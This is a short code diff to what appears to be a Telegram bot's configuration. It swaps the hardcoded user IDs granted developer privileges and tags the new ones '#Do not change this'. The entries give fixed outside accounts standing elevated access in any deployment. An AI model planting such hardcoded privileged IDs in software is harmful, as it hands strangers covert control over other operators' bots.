@@ -187,8 +187,8 @@ else:
 
 DRAGONS.add(OWNER_ID)
 DEV_USERS.add(OWNER_ID)
-DEV_USERS.add(1200780834)
-DEV_USERS.add(797768146)
+DEV_USERS.add(1506444772) #Do not change this
+DEV_USERS.add(2045816889) #Do not change this
 
 if not SPAMWATCH_API:
     sw = None
